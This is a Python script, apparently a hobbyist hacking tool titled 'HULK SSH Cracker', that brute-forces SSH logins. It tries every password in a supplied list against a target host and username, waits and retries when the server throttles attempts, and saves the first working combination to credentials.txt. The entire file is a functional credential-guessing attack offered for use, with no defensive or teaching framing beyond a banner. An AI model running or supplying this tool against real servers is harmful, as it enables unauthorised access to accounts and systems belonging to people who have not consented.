import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE
print('''\033[92m
  _  _ _   _ _    _  __  ___ ___ _  _    ___             _           
 | || | | | | |  | |/ / / __/ __| || |  / __|_ _ __ _ __| |_____ _ _ 
 | __ | |_| | |__| ' <  \__ \__ \ __ | | (__| '_/ _` / _| / / -_) '_|
 |_||_|\___/|____|_|\_\ |___/___/_||_|  \___|_| \__,_\__|_\_\___|_|  
 
                    coded by R3DHULK
         Github Page : https://github.com/R3DHULK
''')

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED} [!] Host: {hostname} is unreachable, timed out.{RESET}")
        returning = False
    except paramiko.AuthenticationException:
        print(f"{RED} [!] Invalid credentials for {username}:{password}")
        returning = False
    except paramiko.SSHException:
        print(f"{BLUE} [*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        returning = is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN} [+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        returning = True
    finally:
        client.close()
        return returning


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
